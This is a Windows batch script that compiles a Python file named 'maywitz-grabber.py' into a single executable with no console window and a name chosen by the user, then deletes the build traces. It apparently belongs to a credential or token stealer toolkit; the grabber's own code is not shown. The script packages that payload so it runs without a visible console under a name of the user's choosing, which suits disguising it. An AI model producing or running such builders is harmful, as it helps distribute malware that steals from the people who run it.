@echo off
color 0a
echo.
set /p a="Enter the name you want to set for your .exe file : "
if [%a%]==[] ( 
    echo.
    echo Please enter a name/?
    pause
    EXIT /B 1
) 
if [%a%] NEQ [] (
    echo.
    echo Name is: %a%
    pyinstaller --clean --onefile --noconsole -i NONE -n %a% maywitz-grabber.py
    rmdir /s /q __pycache__
    rmdir /s /q build
    del /f / s /q %a%.spec
    echo.
    echo Successfully generated the grabber as %a%.exe in the /dist folder
    echo.
    pause
    EXIT /B 1
)
